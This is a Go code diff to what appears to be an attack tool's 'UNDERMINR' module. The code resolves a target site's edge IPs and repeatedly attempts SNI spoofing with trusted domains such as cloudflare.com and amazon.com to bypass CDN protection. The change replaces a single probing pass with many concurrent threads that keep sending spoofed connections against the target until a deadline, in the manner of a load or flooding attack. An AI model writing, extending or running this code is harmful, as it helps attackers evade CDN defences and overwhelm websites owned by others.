@@ -8,6 +8,7 @@ import (
 	"net"
 	"net/url"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 )
@@ -24,7 +25,6 @@ func runUnderminrBypass(cfg *AttackConfig) {
 	target := cfg.Target
 	parsed, err := url.Parse(target)
 	if err != nil {
-		// Try adding https://
 		parsed, err = url.Parse("https://" + target)
 		if err != nil {
 			log.Printf("[UNDERMINR] Invalid target: %v", err)
@@ -35,16 +35,17 @@ func runUnderminrBypass(cfg *AttackConfig) {
 		parsed.Scheme = "https"
 	}
 
-	// Phase 1: Resolve target edge IPs
 	targetHost := parsed.Hostname()
 	addrs, err := net.LookupHost(targetHost)
 	if err != nil || len(addrs) == 0 {
 		log.Printf("[UNDERMINR] Cannot resolve %s: %v", targetHost, err)
+		metricsMu.Lock()
+		metrics.Elapsed = float64(cfg.Duration)
+		metricsMu.Unlock()
 		return
 	}
 	log.Printf("[UNDERMINR] Target edge IPs: %v", addrs)
 
-	// Phase 2: Trusted domains for SNI spoofing
 	trustedDomains := []string{
 		"cloudflare.com", "www.cloudflare.com",
 		"amazon.com", "www.amazon.com", "aws.amazon.com",
@@ -56,50 +57,48 @@ func runUnderminrBypass(cfg *AttackConfig) {
 		"apple.com", "www.apple.com",
 		"netflix.com", "www.netflix.com",
 	}
-	
-	// Quick mode for short duration tests (< 20s)
-	if cfg.Duration < 20 {
-		log.Printf("[UNDERMINR] Quick mode: testing only top 3 trusted domains")
-		trustedDomains = trustedDomains[:3] // Only test cloudflare.com, www.cloudflare.com, amazon.com
-	}
 
-	// Phase 3: Try each edge IP with each trusted domain
-	var bypassOk bool
-	for _, edgeIP := range addrs {
-		for _, trustedHost := range trustedDomains {
-			if atomic.LoadInt32(&stopFlag) == 1 {
-				return
-			}
+	deadline := time.Now().Add(time.Duration(cfg.Duration) * time.Second)
+	var wg sync.WaitGroup
 
-			log.Printf("[UNDERMINR] Trying SNI=%s Host=%s IP=%s",
-				trustedHost, targetHost, edgeIP)
+	for i := 0; i < cfg.Threads; i++ {
+		wg.Add(1)
+		go func(id int) {
+			defer wg.Done()
+			edgeIdx := id % len(addrs)
+			domainIdx := id % len(trustedDomains)
 
-			bypassed := trySNISpoof(edgeIP, targetHost, trustedHost, parsed)
+			for time.Now().Before(deadline) {
+				if atomic.LoadInt32(&stopFlag) == 1 {
+					return
+				}
 
-			if bypassed {
-				log.Printf("[UNDERMINR] BYPASS WORKED! SNI=%s -> IP=%s -> Host=%s",
-					trustedHost, edgeIP, targetHost)
-				bypassOk = true
+				edgeIP := addrs[edgeIdx]
+				trustedHost := trustedDomains[domainIdx]
 
-				// Store result
+				bypassed := trySNISpoof(edgeIP, targetHost, trustedHost, parsed)
+
 				metricsMu.Lock()
-				metrics.Completed++
 				metrics.TotalRequests++
+				if bypassed {
+					metrics.Completed++
+				} else {
+					metrics.Failed++
+				}
 				metricsMu.Unlock()
-			} else {
-				metricsMu.Lock()
-				metrics.Failed++
-				metricsMu.Unlock()
-			}
-		}
-	}
 
-	if !bypassOk {
-		log.Printf("[UNDERMINR] No bypass method worked for this target")
+				edgeIdx = (edgeIdx + 1) % len(addrs)
+				domainIdx = (domainIdx + 1) % len(trustedDomains)
+			}
+		}(i)
 	}
-	metricsMu.Lock()
-	metrics.Elapsed = time.Since(time.Now()).Seconds()
-	metricsMu.Unlock()
+	wg.Wait()
+
+	if cfg.Duration > 0 {
+		metricsMu.Lock()
+		metrics.Elapsed = float64(cfg.Duration)
+		metricsMu.Unlock()
+	}
 }
 
 // trySNISpoof attempts CDN bypass with a specific SNI + Host header combination
